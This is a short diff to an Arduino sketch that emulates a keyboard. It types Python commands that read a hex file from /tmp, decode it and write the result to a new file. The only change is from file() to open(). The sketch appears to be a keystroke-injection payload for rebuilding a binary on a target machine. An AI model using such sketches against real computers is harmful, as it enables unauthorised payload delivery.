@@ -67,13 +67,13 @@ void setup()
   delay(1000);
   Keyboard.println("import binascii");
   delay(1000);
-  Keyboard.println("fileopen = file(\"/tmp/converts.txt\", \"rb\")");
+  Keyboard.println("fileopen = open(\"/tmp/converts.txt\", \"rb\")");
   delay(1000);
   Keyboard.println("data = fileopen.read()");
   delay(1000);
   Keyboard.println("data = binascii.unhexlify(data)");
   delay(1000);
-  Keyboard.println("filewrite = file(\"/tmp/theconverted.txt\", \"w\")");
+  Keyboard.println("filewrite = open(\"/tmp/theconverted.txt\", \"w\")");
   delay(1000);
   Keyboard.println("filewrite.write(data)");
   delay(1000);
